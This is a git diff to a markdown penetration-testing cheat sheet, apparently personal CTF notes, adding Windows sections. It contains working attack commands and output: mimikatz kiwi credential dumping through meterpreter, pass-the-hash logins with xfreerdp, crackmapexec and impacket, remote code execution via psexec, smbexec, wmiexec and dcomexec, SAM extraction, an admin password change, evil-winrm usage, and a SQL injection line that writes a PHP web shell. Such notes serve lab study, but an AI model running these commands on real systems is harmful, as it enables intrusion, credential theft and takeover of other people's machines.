@@ -41,10 +41,28 @@
  - [SMB enumeration(port 445)](#smb-enumeration)
 ### Windows
 - [Basic enumeration](#basic-enumeration-on-linux-and-windows)
+- [Windows SMB enumeration](#windows-smb-enumeration)
+- [xfreerdp](#xfreerdp)
 
 ### Linux Privesc
   - [LXC/LXD container](#lxclxd-privilege-escalation)
   - [Perl setuid capability](#perl-setuid-capability-privesc)
+
+### Windows privesc
+ - [metasploit](#metasploit)
+    - [mimikatz_kiwi](#mimikatz-kiwi)
+ - [impacket](#impacket)
+    - [psexec](#psexec)
+    - [smbexec](#smbexec)
+    - [wmiexec](#wmiexec)
+    - [dcomexec](#)
+    - [crackmapexec](#crackmapexec)
+    - [smbclient](#smbclient)
+  - [evil-winrm](#evil-winrm)
+
+
+### Extra notes
+  - [make NTML hash from password](#make-ntml-hash-from-password)
 -------------------------------------------------------------------------------------------------------------
 # Basic Enumeration
 
@@ -58,22 +76,20 @@ sudo wfuzz -c -f sub-fighter.txt -Z -w /usr/share/seclists/Discovery/DNS/subdoma
 
 Now you may get a ton of output that shows valid subdomains depending on how the site is configured. If you notice a large amount of results that contain the same word count, this may just be an indication that the site returns a 200 response, but it just displays a “Not found” error.
 
-<img src=https://infiniteloginscom.files.wordpress.com/2020/09/image-1.png>
-
-To remove results with a specific word count, you can append your command w/ --hw <value>. For example, our new command that removes results that respond w/ a word count of 290 would look like the following:
+`To remove results with a specific word count, you can append your command w/ --hw <value>. For example, our new command that removes results that respond a word count of 290 would look like the following:`
 
 ```
 wfuzz -c -f sub-fighter -w top5000.txt -u 'http://target.tld' -H "Host: FUZZ.target.tld" --hw 290
 ```
 
-
- ### `sublist3r`
+### `sublist3r`
  
-  with sublist3r it is simple as
+with sublist3r it is simple as
   
-  ```
-  sublist3r -d <domian name>
-  ```
+```
+sublist3r -d <domian name>
+```
+ 
  
 ### `gobuster`
   
@@ -609,6 +625,7 @@ if(!$con)...
 | `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
 | `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |
 
+# Windows
 ----------------------------------------------------------------------------------------------------------
 ## Basic enumeration on linux and windows
 | **Linux**  | **Windows** | **Purpose of command** |
@@ -619,6 +636,28 @@ if(!$con)...
 |`netstat -an`|`netstat -an`|Network connections
 |`ps -ef`|`tasklist`|Running processes
 
+
+## Windows SMB enumeration
+* nmap - SMB Vulnerabilities on Windows
+```
+nmap -p 445 --script smb-vuln-ms06-025 target-IP
+nmap -p 445 --script smb-vuln-ms07-029 target-IP
+nmap -p 445 --script smb-vuln-ms08-067 target-IP
+nmap -p 445 --script smb-vuln-ms10-054 target-IP
+nmap -p 445 --script smb-vuln-ms10-061 target-IP
+nmap -p 445 --script smb-vuln-ms17-010 target-IP
+```
+
+## xfreerdp
+* login with the user hash
+```
+xfreerdp /u:user /d:domain /pth:011AD41795657A8ED80AB3FF6F078D03 /v:10.5.23.42
+```
+
+* login with the user password
+```
+xfreerdp /u:user /d:domain /p:password /v:10.5.23.42
+```
 -----------------------------------------------------------------------------------------------------------
 # Useful find commands example
 
@@ -669,7 +708,7 @@ python3 -m venv env
  * notice that there is a variable added before the username & hostname.
  * now we are inside of the Python virtual environment.
 -------------------------------------------------------------------------------------------------
-# Scecific permission for specific user
+# Specific permission for specific user
 `no permission`
 ```
 setfacl -m u:username:000 myfolder/myfile
@@ -849,4 +888,229 @@ exec "/bin/bash";
 akrech@akr3ch:/tmp$ ./root.pl
 root@akr3ch:/tmp# id
 uid=0(root) gid=1000(akrech) groups=1000(akrech)
+```
+
+# Windows privesc
+
+## metasploit
+
+### mimikatz kiwi
+
+After obtaining a meterpreter shell, we need to ensure that our session is running with SYSTEM level privileges for Mimikatz to function properly.
+```
+meterpreter > getuid
+Server username: WINXP-E95CE571A1\Administrator
+
+meterpreter > getsystem
+...got system (via technique 1).
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+Mimikatz supports 32bit and 64bit Windows architectures. After upgrading our privileges to SYSTEM, we need to verify, with the sysinfo command, what the architecture of the compromised machine is. This will be relevant on 64bit machines as we may have compromised a 32bit process on a 64bit architecture. If this is the case, meterpreter will attempt to load a 32bit version of Mimikatz into memory, which will cause most features to be non-functional. This can be avoided by looking at the list of running processes and migrating to a 64bit process before loading Mimikatz.
+```
+meterpreter > sysinfo
+Computer        : HARIS-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_GB
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows
+```  
+Since this is a 64bit machine, we can proceed to load the Mimikatz module into memory.
+```
+meterpreter > load mimikatz
+[!] The "mimikatz" extension has been replaced by "kiwi". Please use this in future.
+[!] The "kiwi" extension has already been loaded.
+meterpreter > help kiwi
+
+Kiwi Commands
+=============
+
+    Command                Description
+    -------                -----------
+    creds_all              Retrieve all credentials (parsed)
+    creds_kerberos         Retrieve Kerberos creds (parsed)
+    creds_livessp          Retrieve Live SSP creds
+    creds_msv              Retrieve LM/NTLM creds (parsed)
+    creds_ssp              Retrieve SSP creds
+    creds_tspkg            Retrieve TsPkg creds (parsed)
+    creds_wdigest          Retrieve WDigest creds (parsed)
+    dcsync                 Retrieve user account information via DCSync (unparsed)
+    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
+    golden_ticket_create   Create a golden kerberos ticket
+    kerberos_ticket_list   List all kerberos tickets (unparsed)
+    kerberos_ticket_purge  Purge any in-use kerberos tickets
+    kerberos_ticket_use    Use a kerberos ticket
+    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
+    lsa_dump_sam           Dump LSA SAM (unparsed)
+    lsa_dump_secrets       Dump LSA secrets (unparsed)
+    password_change        Change the password/hash of a user
+    wifi_list              List wifi profiles/creds for the current user
+    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
+```
+* now we can simply use those above commands to privesc our target machine
+* here are some examples
+`cheds_all`
+```
+meterpreter > creds_all 
+[+] Running as SYSTEM
+[*] Retrieving all credentials
+msv credentials
+===============
+
+Username       Domain    NTLM                              SHA1
+--------       ------    ----                              ----
+Administrator  haris-PC  cdf51b162460b7d5bc898f493751a0cc  dff1521f5f2d7436a632d26f079021e9541aba66
+
+wdigest credentials
+===================
+
+Username       Domain     Password
+--------       ------     --------
+(null)         (null)     (null)
+Administrator  haris-PC   ejfnIWWDojfWEKM
+HARIS-PC$      WORKGROUP  (null)
+
+kerberos credentials
+====================
+
+Username       Domain     Password
+--------       ------     --------
+(null)         (null)     (null)
+Administrator  haris-PC   (null)
+haris-pc$      WORKGROUP  (null)
+```
+`cheds_msv`
+```
+meterpreter > creds_msv
+[+] Running as SYSTEM                                                                                                                                        
+[*] Retrieving msv credentials                                                                                                                               
+msv credentials                                                                                                                                              
+===============                                                                                                                                              
+                                                                                                                                                             
+Username       Domain    NTLM                              SHA1                                                                                              
+--------       ------    ----                              ----                                                                                              
+Administrator  haris-PC  cdf51b162460b7d5bc898f493751a0cc  dff1521f5f2d7436a632d26f079021e9541aba66
+```
+
+`password_change`
+```
+meterpreter > password_change -p ejfnIWWDojfWEKM -P akrech404 -u Administrator
+[*] No server (-s) specified, defaulting to localhost.
+[+] Success! New NTLM hash: 2081d1de9b8df44ed3a37963ae802d10
+```
+#### Login with the new password
+```
+┌──(kali㉿bughunt3r)-[/opt/win]
+└─$ python3 psexec.py Administrator:akrech404@10.10.10.40
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.40.....
+[*] Found writable share ADMIN$
+[*] Uploading file MiONxDaQ.exe
+[*] Opening SVCManager on 10.10.10.40.....
+[*] Creating service xXQL on 10.10.10.40.....
+[*] Starting service xXQL.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> 
+```
+
+## impacket
+
+#### [github link](https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_24)
+
+### psexec
+
+* remote code execution 
+```
+python psexec.py domain/user:password@IP <command>
+```
+* Shell via pass-the-hash:
+```
+python psexec.py -hashes:<hash> <user_name>@<remote_hostname>
+```
+* Shell via pass-the-password:
+```
+python psexec.py Administrator:<password>4@<remote_hostname>
+```
+* Shell via no-pass
+```
+python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+```
+### smbexec
+
+* remote code execution
+```
+python smbexec.py domain/user:password@IP <command>
+```
+
+### wmiexec
+
+* remote code execution 
+```
+python wmiexec.py domain/user:password@IP <command>
+```
+### dcomexec
+
+* remode code execution
+```
+python dcomexec.py domain/user:password@IP <command>
+```
+
+### crackmapexec
+* over a subnet and extract SAM file:
+```
+python crackmapexec -u Administrator -H :011AD41795657A8ED80AB3FF6F078D03 <target_IP> --sam
+```
+### smbclient
+Browse shares via pass-the-hash:
+```
+python smbclient.py <target_domain>/Administrator@<target_ip> -hashes 01[...]03:01[...]03
+```
+* a generic SMB client that will let you list shares and files, rename,
+* upload and download files and create and delete directories
+
+```
+smbclient.py domain/user:password@IP
+smbclient.py -dc-ip 10.10.2.1 -target-ip 10.10.10.24 domain/user:password
+```
+
+## evil-wimrm
+
+#### [github link](https://github.com/Hackplayers/evil-winrm)
+
+install with gem `sudo gem install evil-winrm`
+if you are using kali-linux; then it can be easily installed by `sudo apt install evil-winrm`
+
+### Simple usage
+
+* `connect` with the target
+```
+evil-winrm -i <target_IP> -u <user> -p <password>
+```
+
+* `download` & `upload` files
+`upload`
+```
+upload local_filename (destination_filename)
+```
+`download`
+```
+download remote_filename (destination_filename)
+```
+
+
+
+# Extra notes
+
+### make NTML hash from password
+
+```
+python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
 ```
